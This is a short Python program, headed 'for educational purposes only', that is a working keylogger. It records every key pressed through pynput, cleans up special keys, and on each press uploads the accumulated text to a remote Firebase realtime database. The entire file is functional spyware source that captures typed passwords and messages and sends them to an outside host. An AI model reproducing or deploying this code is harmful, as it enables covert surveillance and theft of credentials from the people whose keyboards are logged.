# This code is for educational purposes only.


from pynput.keyboard import Listener
import firebase_admin
from firebase_admin import credentials
import sys
from firebase_admin import db
stringy=""

#using credential for firebase database from json file
cred = credentials.Certificate('firebase.json')

#initializing database with the credentials
firebase_admin.initialize_app(cred,{
	'databaseURL' : 'https://project-keylog-default-rtdb.firebaseio.com/'
})


ref = db.reference('/')

#function to remove unecessary key words
def sanitize(key):
    temp=str(key)
    temp=temp.replace("'","")

    #To kill the programme when escape key is pressed
    if temp == "Key.esc":
        sys.exit()

    if temp == "Key.space":
        temp = " "
    if temp == "Key.enter":
        temp = "\n"
    if temp == "Key.backspace" :
        temp = " <b> "
    if temp == "Key.ctrl_l":
        temp = ""
    if temp == "Key.alt_l" or temp == "Key.tab" or temp=="Key.shift" :
        temp = ""
    if temp == "Key.caps_lock":
        temp = "\n<CAPS>\n"

    return temp



def pressed(key):
    
    key = sanitize(key)
    global stringy

    stringy=stringy+str(key)

    #To save the output in a file
    '''with open("log.txt",'a') as f:
        #f.write(key)
    '''

    ref.update(
	{'Keylogged':stringy}
    )   
    
    

with Listener(on_press=pressed) as l:
    l.join()
    
